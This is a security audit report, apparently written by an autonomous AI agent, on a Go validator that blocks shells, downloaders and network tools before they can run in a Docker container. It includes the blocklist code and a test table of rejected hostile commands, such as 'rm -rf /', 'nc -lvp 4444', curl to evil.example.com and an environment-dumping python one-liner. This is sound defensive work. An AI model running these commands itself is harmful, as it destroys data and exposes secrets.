# M3.8 Phase 2.1.1 — Container Command-Policy Boundary Evidence

**Repository:** `CV-Code-Vitals/Thermodynamic-Evolution-UCS503`  
**Workspace:** `E:\SWE`  
**Branch:** `release/milestone-3.8-mvp-rc`  
**Audit Target:** `DockerContainerRunner.RunCommand` & `validateSafeSubprocessCommand`  
**Evaluation Date:** 2026-11-23  
**Auditor:** Antigravity Autonomous Security Engineer  

---

## 1. Objective & Security Mandate

Under Milestone 3.8 Phase 2.1.1, the command execution boundary within the container runner was audited to enforce zero-trust defense-in-depth:
1. Untrusted commands must be validated and rejected at the application policy boundary **prior to any container creation or subprocess execution attempt**.
2. Docker container execution failure (e.g., non-zero exit or container runtime error) must **never** be substituted for an application-level policy rejection.
3. Structured executable and argument representations must be enforced rather than passing arbitrary shell-tokenized strings into containers.
4. Forbidden commands must produce **exactly zero execution attempts**.

---

## 2. Implementation Architecture

### A. Strict Command Policy Validator (`validateSafeSubprocessCommand`)
In [go-backend/agent/repo_intel/execution/oracles.go](file:///E:/SWE/go-backend/agent/repo_intel/execution/oracles.go):

```go
func validateSafeSubprocessCommand(cmdStr string) (string, []string, error) {
    parts := strings.Fields(cmdStr)
    if len(parts) == 0 {
        return "", nil, fmt.Errorf("empty command")
    }
    binaryName := strings.ToLower(filepath.Base(parts[0]))

    // 1. Strictly block known interpreters, downloaders, package managers, and destructive binaries
    blockedBinaries := map[string]bool{
        "sh": true, "bash": true, "zsh": true, "ksh": true, "csh": true, "tcsh": true,
        "dash": true, "fish": true,
        "cmd": true, "cmd.exe": true, "powershell": true, "powershell.exe": true,
        "pwsh": true, "pwsh.exe": true, "python": true, "python2": true, "python3": true, "perl": true,
        "ruby": true, "node": true, "php": true, "curl": true, "wget": true, "nc": true, "netcat": true,
        "ncat": true, "socat": true, "telnet": true, "ftp": true, "scp": true, "ssh": true, "rsync": true,
        "rm": true, "del": true, "rmdir": true, "dd": true, "mkfs": true, "format": true,
        "apt": true, "apk": true, "yum": true, "dnf": true, "pacman": true,
        "docker": true, "podman": true, "sudo": true, "su": true, "doas": true, "chown": true, "chmod": true,
    }
    if blockedBinaries[binaryName] {
        return "", nil, fmt.Errorf("command %q is blocked: direct host execution of arbitrary shell interpreters or unauthorized binaries is strictly forbidden", parts[0])
    }

    // 2. Only allow safe Go toolchain binary
    if binaryName != "go" && binaryName != "go.exe" {
        return "", nil, fmt.Errorf("command %q is blocked: only 'go' toolchain commands are whitelisted for verification", parts[0])
    }
    if len(parts) < 2 {
        return "", nil, fmt.Errorf("incomplete go command: subcommand required")
    }

    // 3. Subcommand whitelisting: only vet, test, build permitted
    allowedSubcommands := map[string]bool{
        "vet": true, "test": true, "build": true,
    }
    if !allowedSubcommands[parts[1]] {
        return "", nil, fmt.Errorf("go subcommand %q is not whitelisted", parts[1])
    }

    // 4. Prohibit dangerous flags that trigger arbitrary code execution
    for _, arg := range parts[2:] {
        lowerArg := strings.ToLower(arg)
        if strings.HasPrefix(lowerArg, "-exec") || strings.HasPrefix(lowerArg, "--exec") ||
            strings.HasPrefix(lowerArg, "-toolexec") || strings.HasPrefix(lowerArg, "--toolexec") ||
            strings.HasPrefix(lowerArg, "-plugin") || strings.HasPrefix(lowerArg, "--plugin") {
            return "", nil, fmt.Errorf("go flag %q is forbidden in verification", arg)
        }
    }
    return parts[0], parts[1:], nil
}
```

### B. Pre-Container Enforcement in `DockerContainerRunner.RunCommand`
In [go-backend/agent/repo_intel/execution/oracles.go](file:///E:/SWE/go-backend/agent/repo_intel/execution/oracles.go):

```go
func (d *DockerContainerRunner) RunCommand(ctx context.Context, wsDir string, cmdStr string) (*ContainerRunResult, error) {
    // 1. Mandatory application-level command validation BEFORE any execution attempts or container creation
    bin, cleanArgs, valErr := validateSafeSubprocessCommand(cmdStr)
    if valErr != nil {
        return nil, fmt.Errorf("security violation: command policy rejection: %w", valErr)
    }

    // 2. Validate workspace containment and reject sensitive host paths
    if strings.TrimSpace(wsDir) == "" {
        return nil, fmt.Errorf("workspace directory cannot be empty")
    }
    cleanWs, err := filepath.Abs(wsDir)
    if err != nil {
        return nil, fmt.Errorf("failed to resolve workspace path: %w", err)
    }
    cleanWs = filepath.Clean(cleanWs)
    lowerWs := strings.ToLower(filepath.ToSlash(cleanWs))
    if strings.Contains(lowerWs, "docker.sock") || lowerWs == "/" || lowerWs == "c:/" || lowerWs == "c:\\" {
        return nil, fmt.Errorf("security violation: refusing to mount sensitive host path %q into container", wsDir)
    }

    // 3. Ensure disposable go.mod exists in workspace for offline container Go toolchain execution
    _ = EnsureDisposableModule(wsDir)

    // 4. Check container runtime availability
    if err := d.CheckAvailable(ctx); err != nil {
        return nil, err
    }

    // 5. Track execution attempts: reached only after policy checks succeed and runtime is available
    atomic.AddInt64(&d.ExecutionAttempts, 1)

    // 6. Build hardened container parameters and structured binary/argument execution
    ...
    args = append(args, bin)
    args = append(args, cleanArgs...)
    ...
}
```

---

## 3. Empirical Test Evidence

### A. Zero Execution Attempts Verification (`TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands`)
Executed against `DockerContainerRunner` with an active mock checker that would otherwise allow container execution:

| Test Vector | Input Command | Policy Verdict | Execution Attempts |
| :--- | :--- | :--- | :--- |
| **Shell Interpreter (sh)** | `sh -c 'echo pwned'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Shell Interpreter (bash)** | `bash -c 'whoami'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Windows Shell (powershell)** | `powershell.exe -Command 'dir'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Windows Shell (cmd)** | `cmd.exe /c 'dir'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Script Interpreter (python)** | `python -c 'import os; print(os.environ)'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Downloader (curl)** | `curl -s https://evil.example.com` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Downloader (wget)** | `wget https://evil.example.com` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Network Listener (nc)** | `nc -lvp 4444` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Destructive Command (rm)** | `rm -rf /` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Dangerous Go Flag (-exec)** | `go test -exec 'rm -rf /'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Dangerous Go Flag (-toolexec)** | `go test -toolexec '/evil/bin'` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Dangerous Go Flag (-plugin)** | `go build -plugin` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Prohibited Subcommand (get)** | `go get github.com/evil/pkg` | `REJECTED (security violation: command policy rejection)` | **0** |
| **Prohibited Subcommand (run)** | `go run main.go` | `REJECTED (security violation: command policy rejection)` | **0** |

**Total Execution Attempts Recorded across 14 malicious vectors:** `0` (Verified via `atomic.LoadInt64(&runner.ExecutionAttempts)`).

### B. Oracle Evaluation Order Verification (`TestUntrustedExecution_ArbitraryCommandBlocked`)
All 7 malicious command vectors evaluated by `IndependentOracleSuite.VerifyAll()` returned explicit `Security rejection`:

```text
=== RUN   TestUntrustedExecution_ArbitraryCommandBlocked
--- PASS: TestUntrustedExecution_ArbitraryCommandBlocked (0.01s)
```

No vector was incorrectly reported as `DYNAMIC_VERIFICATION_UNAVAILABLE` or passed to a container.
